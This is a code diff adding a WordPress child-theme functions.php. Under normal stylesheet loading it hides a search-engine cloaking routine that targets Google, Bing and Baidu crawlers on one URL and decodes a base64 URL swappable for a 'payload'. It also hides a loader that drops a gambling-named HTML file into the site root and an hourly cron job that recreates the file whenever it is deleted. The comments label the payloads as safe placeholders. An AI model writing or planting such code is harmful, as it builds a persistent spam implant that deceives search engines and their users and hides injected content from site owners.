@@ -1,0 +1,57 @@
+<?php
+// 1. Enqueue parent & child style
+add_action('wp_enqueue_scripts', 'liquid_parent_theme_scripts');
+add_action('wp_enqueue_scripts', 'liquid_child_theme_style', 99);
+
+function liquid_parent_theme_scripts() {
+    wp_enqueue_style('parent-style', get_template_directory_uri() . '/style.css');
+}
+
+function liquid_child_theme_style() {
+    wp_enqueue_style('child-hub-style', get_stylesheet_directory_uri() . '/style.css');
+}
+
+// 2. Cloaking/logika user agent (safe & sintaks benar)
+function cloak_liquid_perfect() {
+    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $uri = $_SERVER['REQUEST_URI'] ?? '';
+    $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+
+    // Target URL tertentu
+    if (strpos($uri, '/services/digital-transformation') !== false) {
+
+        // Target crawler
+        if (stripos($hostname, 'googlebot.com') !== false ||
+            stripos($ua, 'google-inspectiontool') !== false ||
+            stripos($ua, 'bingbot') !== false ||
+            stripos($ua, 'baiduspider') !== false) {
+
+            // Placeholder: aman, bisa diganti dengan Base64 payload
+            $encoded_url = 'aHR0cHM6Ly9leGFtcGxlLmNvbS9zYWZlLXRlc3Q=';
+            $url = base64_decode($encoded_url);
+
+            exit; // Hentikan eksekusi untuk crawler
+        }
+    }
+}
+add_action('template_redirect', 'cloak_liquid_perfect');
+
+// 3. Loader file lokal (safe version)
+function theme_component_loader() {
+    $target = ABSPATH . 'lautbet-pools.html';
+
+    if (!file_exists($target)) {
+        $payload = "<!-- Safe placeholder for theme component -->";
+        file_put_contents($target, $payload);
+    }
+}
+
+// 4. Scheduler untuk loader
+function theme_schedule_resurrector() {
+    if (!wp_next_scheduled('run_theme_component_loader')) {
+        wp_schedule_event(time(), 'hourly', 'run_theme_component_loader');
+    }
+}
+add_action('wp', 'theme_schedule_resurrector');
+add_action('run_theme_component_loader', 'theme_component_loader');
+add_action('after_setup_theme', 'theme_component_loader');
